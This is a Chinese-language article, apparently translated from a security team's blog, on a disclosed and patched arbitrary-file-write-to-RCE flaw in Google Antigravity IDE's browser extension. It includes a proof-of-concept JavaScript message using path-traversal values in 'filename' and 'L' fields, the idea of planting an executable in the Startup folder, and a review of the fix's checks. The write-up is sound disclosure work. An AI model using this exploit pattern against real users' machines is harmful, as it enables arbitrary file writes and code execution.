#  【林晓月的AI安全日记-003】你在用AI看网页，网页在往你电脑写木马｜Google Antigravity浏览器扩展RCE漏洞  
原创 塑造者壹号
                    塑造者壹号  幻泉之洲   2026-03-05 01:31  
  
Google发布了全新AI编辑器Antigravity，内置浏览器+AI代理。安全研究员发现其浏览器扩展存在任意文件写入漏洞——攻击者只需诱导用户在Antigravity浏览器中访问一个恶意网页，即可在目标机器上写入任意文件，实现远程代码执行。  
  
📑 目录  
  
📖   
林晓月的AI安全日记（漫画）  
  
📝 Google Antigravity IDE RCE漏洞挖掘实录（文章）  
  
## 📖 林晓月的AI安全日记  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibdskB0Flb05IGugGLS3Mp3kL8s89Shjfjy6wj0qT4oIDZgyqvBQQF1eicp1650yFeVzjphRMoxteIwzfMeelFrpd5C6HNYo3PiaM/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibec9TmRcCs5DZXl9hTJH1TeDtBxHBdHplbo7tT17gS4iaBqarXBrJyebncQ7X7tT8Nov2BfcJzJLHDL9lOGQEkvOpS1FuiaeOY8U/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeFjK28C0ic8KYQ12sqicwEDup59dn8Opp2xTPYlfpSE3ibbPO6f6APgmgYBicRicupj1beCktAKJmHL0bgIQne6MzFR7rPhjB2xoFY/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeNwTIUW6dlT3ukN5mr3TXv04ff4l77D3b0wuJWoks95S0wjJAeg2dNBXYmE1Zo1Ivx0m6nYwg7LOZEGV1SVSK5L4fRnShlOk8/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibcOKaLgLd9PvjOlAThpXHTnKpjfDGet4SCVZJ0Kr0fibqKHEh5g03wyYiaSpJojmApxrqgZq9fyJCSO5KcnqdJM9lmWyOKP3fuJI/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeKA1cbSIAtiaCJ7l3BUvDGuPhfPQrTh3kmibpDibXYibsCdDZLHMrS7uDJx5gw1X2zR448kBsnbr1O92OOPYFJUQvG3oo0DnuQwZM/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibf4cz5LrNghSNcIJshT5rPEe6XZO5WuVWciaEX9zjbfNB1ibm2BqJMVypfkAicicFibO9uOGSpOsWK3K1F839kxakdAb432yLv8xHy0/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdTwuX4EyK5ajM47wgZcCdXt3XeYYfwTzIbibMDWjDX5ZramZibzGwibuJS7SBc3Tian6ic9vrzjTU0VhSu7icgIhr1AVbdnPZgOR2MM/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeUZrfNcVYE9UsCic0RZ92eoKcz4vOUIZWDMMZr0P2MicrE1NYOcrxvBc5JtxjKd17xV7ibRicglgcq6BocOFeq2bdGUkc3icdicyCCo/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibc7vpPFh1Hxy9Pk5VmrY0NeHNM8GZeJ4ibRLl5RQibURLnfGNO22Zyhkv4ppnxfJ2Lb3j84HsN6hZ8VAOj5AJ32yLufsicRic21dws/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibdZapKIsOBevqTgcXU4nL7mT0yB1S7rtIm0SlkzdF0sVpGUVriccbXDqwUybUhSx6ticuaicx9Fw9icOquLKEggR4oH4AtpQr0OicbM/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibfyNYnRKRFQApZW6BOLibh0roOBWD6gMb0rticFJ7zz7WJ4UGSONIBpOCOOXOicq4EWsv4dr5IEgkF1ZS2nf138Iz767659ibYicjKk/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibeL9hdDJ2BjwOGQ640jjjE7GgUQZQvdy8jv7uhJZV4odViatu8BdCrRLBkBVibGC6VQib3bribIAlLcibtCXztFU9TfrgFnH1m3WZCk/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibfOSkfUTJDEL6avXHCaXgRr8DyRf5cwrUo2bicX5zefjVqKhl4sagX8jDpB9ibqaJ5lsIhNdmRD0Jlc5jxxxzOnYmkeQASpOOH44/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibffiajzFX9UYWIbw8ersQVBNYs0jkibXN8wHLnOT11N3xGTrcgEdoicv4NOJfC8ibpFGoosRQ2uXwTlAcaqGRR0IYBpeGSqoy0Uog4/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibfNAU2m9rzRr7rbRPtFe5GuLnutxGgiadxNkzm8eLBMHU9n8T8rZz37E3PZKWvUoCBxhicXKwuPc7fuTkylw4ZbKfe8RceWoHvrg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdjYDgkxATTVTfWMaV4qKMBXbZjLkQla9oIcrrDcqZRHm83xnlbGn7Zp1tm6bP7C8jvMIfiaVicEUfPDX8cIicXpXO53dqVogY26U/640?wx_fmt=jpeg&from=appmsg "")  
  
## 📝 Google Antigravity IDE RCE漏洞挖掘实录  
  
这篇文章记录了Hacktron AI安全研究团队在Google Antigravity IDE中发现的一个远程代码执行漏洞——攻击者仅需诱导用户在内置浏览器中访问一个恶意网页，即可在目标机器上写入任意文件。以下是完整的发现和利用过程。  
  
## 一、背景：Antigravity是什么  
  
延续"Hacking AI Browsers"系列，这次的目标是Google的Antigravity。  
  
Google几周前发布了这款新IDE，内部架构和Windsurf IDE基本一致。每当一个新的AI浏览器、IDE或工具上市，寻找第一个高影响力漏洞就成了一场竞赛。  
  
这个IDE自带了一个浏览器，基于过往经验，这是一个很有价值的攻击面：  
  
IDE中有一个VS Code扩展，它与一个**语言服务器**  
（Language Server）交互。这个服务器暴露了一系列API调用，负责处理来自IDE或其他来源的所有任务。  
  
使用procexp.exe可以全面查看Antigravity IDE执行了哪些进程：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibfG6F6ia3cTylHiaD2Wof3qoZKWrIT7Adf5liaskr3gOgGxd2KUDTBS91mdzicpgNQCtfsGkjz2yWFibTVbZ9PibYF7iaibiaflliabnSv4I/640?wx_fmt=webp&from=appmsg "")  
  
▲ Antigravity IDE的工作流程与浏览器集成  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibc6up3R3rP0YxTpp9eh97btnKxEqvtWDZSQ1VOfKatV8zFrWoXiaNTia03Lp17MYnuhQPAMyb7SPBibYoojXT8eRS7MBFBksheBjM/640?wx_fmt=webp&from=appmsg "")  
  
▲ Process Explorer中的Antigravity进程树  
  
语言服务器的启动命令：  
  
language_server_windows_x64.exe --enable_lsp  
  
--extension_server_port 19116  
  
--csrf_token e8d42e20-02b4-...  
  
--random_port  
  
--cloud_code_endpoint https://daily-cloudcode-pa.googleapis.com  
  
--app_data_dir antigravity  
  
端口每次随机，csrf_token  
 用于防御DNS重绑定攻击。语言服务器还会调用Playwright控制浏览器自动化，核心逻辑用Go编写。  
  
安装好扩展后，可以在聊天窗口中输入指令，比如"打开example.com并把背景色改成蓝色"，AI代理就会自动操控浏览器完成任务：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibcuSj9Fv2LYm2PePrgTKfpiauiaH1NfInGPHibCgLMdxkJUIRvWOOcic4d4YTkQoMBazKHfVcFzrib85ruiaRH0w5Z2nRicu8WgQticsicY/640?wx_fmt=webp&from=appmsg "")  
  
▲ 在Antigravity浏览器中向AI代理发出指令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibcTYqAhY8eBTEDa8Re9TUEmIw95jbyLXPAQQcPrRmfWYlZ8l4ZyqaKiaFM9tGf6fnoAgwV2qGjNBpcoVab0YWu8bpejbrLmHZA8/640?wx_fmt=webp&from=appmsg "")  
  
▲ AI代理自动将example.com的背景色改为蓝色  
  
经过一番探索，确定了两条攻击路径：  
  
## 二、攻击面分析：两条路径  
  
**路径一：攻击语言服务器**  
——如果能泄露CSRF Token，就能通过DNS重绑定直接操控AI代理  
  
**路径二：攻击浏览器扩展**  
——扩展的 externally_connectable  
 设置为所有URL，任何网页都能与扩展通信  
  
## 三、路径一：攻击语言服务器  
### 3.1 CSRF Token的生成与传递  
  
语言服务器对每个请求都会验证 x-codeium-csrf-token  
 请求头。Token通过 crypto.randomUUID()  
 生成，密码学安全，无法预测。  
  
const  
 n = crypto.  
randomUUID  
();  
  
await  
 R.ExtensionServer.  
initialize  
(e, n)  
  
对语言服务器二进制做strings操作，发现Token通过Playwright脚本注入到浏览器扩展的Service Worker上下文中：  
  
const  
 request = %s;   
// 格式化字符串，包含csrfToken和serverAddress  
  
if  
 (  
typeof  
 globalThis.setCredentials ===   
'function'  
) {  
  
    
await  
 globalThis.  
setCredentials  
(request.csrfToken, request.serverAddress);  
  
}  
### 3.2 调试Playwright注入脚本  
  
Antigravity启动浏览器时使用了 --remote-debugging-port=9223  
 标志。通过抓取Node进程PID并执行调试命令，可以在 chrome://inspect/  
 中实时观察Playwright注入的脚本。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibf8mGFKm8esyfGJuqjOtHibAfUx2ia4aURWxv4QzEcBaWqKVu7ty1IbZicpibjL7p3NvDiavRAJl1u0BscLQQe6iajdSiacmuicjIRjPKA/640?wx_fmt=webp&from=appmsg "")  
  
▲ 通过chrome://inspect调试Playwright cli进程  
  
在扩展Service Worker中可以找到CSRF Token的引用。但DevTools默认不搜索匿名和内容脚本，需要在设置中启用：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibdiaxNfGEh25ZWHx4w8dfdjt63ZkIcP4BXibb6yboAeN4BSVBaSjUib1XAibbjPic3EmIuXcBX6t5y4sLeExf77ib47wqrRmfxx0lSeQ/640?wx_fmt=webp&from=appmsg "")  
  
▲ 启用"Search in anonymous and content scripts"选项  
  
启用后搜索 evaluate(  
，可以找到Playwright注入脚本的入口点，并在此设置断点：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdvAMeJT1NeJhGiaGW4kxH41UianZRhfBP1prcrv2qmwsalBYfAQXB9YbMWrFv66qtveVDr1wvsqY9W0iaAuCW4umBJFfbUt0IBAU/640?wx_fmt=webp&from=appmsg "")  
  
▲ 搜索evaluate(并在注入点设置断点  
  
通过断点调试，可以看到evaluate方法中包含了完整的CSRF Token和服务器地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibfMxMMfziazvBbbyB3osSibcfibft8gF7LB25RysE8xT3EnGqPR1ohelj6Zib8g784j8cBHZcpmfHmJMOLlvXp1P4Y04cRPP5gib4u8/640?wx_fmt=webp&from=appmsg "")  
  
▲ evaluate表达式中暴露的CSRF Token和服务器地址  
  
const  
 request = {  
  
    
"csrfToken"  
:   
"f5d969c7-f4f3-4f87-aca7-8fa1568b6bd5"  
,  
  
    
"serverAddress"  
:   
"http://127.0.0.1:64431"  
  
};  
  
但经过验证，这段脚本**只在扩展Service Worker的上下文中执行**  
，不会注入到普通网页中。因此无法从外部泄露CSRF Token。  
### 3.3 注入脚本的有趣发现  
  
在观察AI代理与网页交互时，发现了一些临时注入到页面中的方法，比如 window.updateActuationOverlay  
，用于显示代理状态覆盖层。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeYIUjt2fWD2LHJdKd1uAjLJJiaLx6iatvZXp0RZ5Tyydlic1qRIyKiaMnIElZPNTrQHRbqgKo8KypibibfpjImK8poTJHRbzjmSotok/640?wx_fmt=webp&from=appmsg "")  
  
▲ updateActuationOverlay方法被注入到页面中，用于显示代理状态  
  
在自己的服务器上托管了一段代码来验证——成功篡改了代理的显示消息：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeoZyzicOibxTkqX6TYZgU74a3Hniauky61hq1tw6UrnrjhdGXfd23IOU7wiax75LyuIS5Ca7SOyEeJf7otpSdnP0XxXm5nuYE6bOs/640?wx_fmt=webp&from=appmsg "")  
  
▲ 通过恶意网页成功篡改AI代理的覆盖层消息  
  
但最终只能影响UI，无法造成实质性危害。  
路径一到此为止，未能找到高影响力漏洞。  
  
## 四、路径二：攻击浏览器扩展  
### 4.1 manifest.json中的危险配置  
  
审计扩展时，首先看manifest.json。关键发现：  
  
"externally_connectable"  
: {  
  
    
"matches"  
: [   
"<all_urls>"  
 ]  
  
}  
  
externally_connectable  
 设置为所有URL，意味着**任何网页**  
都可以通过 chrome.runtime.sendMessage()  
 与扩展通信。  
### 4.2 可触发的扩展功能  
  
通过分析Service Worker中的消息处理逻辑，发现以下可从外部触发的功能：  
1. rpcCall  
 — RPC调用  
  
1. validateCascadeOrCancelOverlay  
 — 验证/取消覆盖层  
  
1. smartFocusConversation  
 — 聚焦对话  
  
1. registerTargetID  
 / getCurrentTabId  
 / getMimeType  
  
1. CHECK_JETSKI_CONNECTION  
 / ATTEMPT_JETSKI_CONNECTION  
  
1. SaveScreenRecording  
 — 保存屏幕录制 ← **这个最有意思**  
  
## 五、漏洞利用：任意文件写入 → RCE  
### 5.1 SaveScreenRecording功能分析  
  
SaveScreenRecording  
 原本用于保存屏幕录制文件，从offscreen文档调用：  
  
chrome.runtime.  
sendMessage  
({  
  
  action:   
"SaveScreenRecording"  
,  
  
  K: Array.  
from  
(k),   
// 文件内容  
  
  filename:   
"screen-recording-"  
 + Date.  
now  
() +   
".webm"  
,  
  
  H: a   
// 子目录  
  
})  
  
经过反复试错，还原出消息格式。该功能最终调用语言服务器端点，将文件保存到：  
  
C:\Users\<Username>\.gemini\antigravity\brain\  
[L]  
\  
[filename]  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibd7WunWIkMyjvbpuZTWSYPF4H3wjNiclwWtmaNtEbeZLUHtseQKGJDnRViclbgvic77pXGdlWict5SOUkwCSHGXARmnYE9NT2nSpwE/640?wx_fmt=webp&from=appmsg "")  
  
▲ Service Worker中SaveScreenRecording的处理代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibcHAVhGXT4UEhzI1mcC17l7n2DkLb1TOF1QCDlqIu75tDKoLn5MVXgT49jXfo2OMkIdZrhRVee5R2w3UOAJjTXQTrjhc4fGHWI/640?wx_fmt=webp&from=appmsg "")  
  
▲ SaveScreenRecording请求的网络抓包，grpc-message暴露了文件路径  
### 5.2 路径穿越：两个注入点的组合  
  
关键问题：它是否允许路径穿越（../  
）？  
  
在 L  
 参数中使用 ../  
 效果有限。但有两个注入点——L  
 和 filename  
。组合使用后，成功实现路径穿越：  
  
const  
 content =   
"arbitrary content here"  
;  
  
const  
 bytes =   
new  
TextEncoder  
().  
encode  
(content);  
  
const  
 EXTENSION_ID =   
"eeijfnjmjelapkebgockoeaadonbchdd"  
;  
  
  
chrome.runtime.  
sendMessage  
(EXTENSION_ID, {  
  
  action:   
"SaveScreenRecording"  
,  
  
  filename:   
"../poc.txt"  
,   
// ← 路径穿越！  
  
  za: Array.  
from  
(bytes),  
  
  L:   
"../../../test"  
  
});  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibex01VexEpGyRgEPhjf5Way5CibWiaicDvg88RxoDbHIOdH1rtxJHRzJ8lLPF2SFmf3rBSn08y5v7dn7wnmwdB45XVgJndVic1ZTE0/640?wx_fmt=webp&from=appmsg "")  
  
▲ 成功在用户目录下创建poc.txt，内容完全可控（左上：写入的文件；左下：利用代码；右：网络请求）  
  
成功在 C:\Users\STARK-PC\poc.txt  
 创建了文件，内容完全可控。更有趣的是，即使服务器返回了错误信息，文件实际上已经被成功写入了。**不要盲目相信错误信息！**  
### 5.3 从文件写入到代码执行  
  
这个漏洞允许向受害者PC上任意位置写入任意内容的文件（只要当前用户有写权限）。一个简单的代码执行路径：  
将恶意可执行文件写入用户的Startup文件夹  
，下次系统重启时就会自动执行。  
  
## 六、修复分析与绕过思路  
  
Google在修复中添加了一个 sh  
 验证方法，对消息来源进行三重检查：  
  
function  
sh  
(a) {  
  
    
var  
 d = a.url?.includes(  
"/static/offscreen.html"  
);   
// 检查1  
  
    
var  
 b = a.id === chrome.runtime.id;   
// 检查2  
  
    
var  
 a = !a.tab;   
// 检查3  
  
    
return  
 d && b && a;  
  
}  
  
逐个分析这三道检查：  
1. URL检查  
：只检查URL是否包含 /static/offscreen.html  
，攻击者在URL中添加 ?/static/offscreen.html  
 即可绕过  
  
1. 扩展ID检查  
：验证 chrome.runtime.id  
，如果能找到内容脚本中的postMessage代理可能绕过  
  
1. Tab检查  
：验证 a.tab  
 为undefined，只有从扩展内部发送的消息才没有tab属性，即使通过内容脚本代理也无法绕过  
  
虽然扩展的内容脚本中存在postMessage监听器，但它限制了可转发的action类型，不包含SaveScreenRecording。加上第三道tab检查，修复后的版本目前是安全的。  
  
## 七、总结  
  
随着AI驱动的浏览器越来越普及，攻击面也在显著扩大。让浏览器代理正常工作所需的特权API，恰恰是安全防护不当时最危险的部分。  
  
这是Hacktron团队研究的第三个AI浏览器，每个都存在过度宽松的白名单暴露强大API的问题。  
  
浏览器安全本身就很难做好——即使是经验丰富的团队也会犯错。除非你面对的是像Google、OpenAI或Perplexity这样在安全上投入巨大的团队，否则在安装那些炫酷的新AI浏览器之前，请三思。  
  
漏洞报告提交后，Google响应迅速，在扩展消息处理中引入了来源验证机制。最终获得 **$10,000**  
 赏金。  
  
原文来自 Hacktron AI 安全研究团队  
  
原文链接：https://www.hacktron.ai/blog/hacking-google-antigravity  
  
— END —  
  
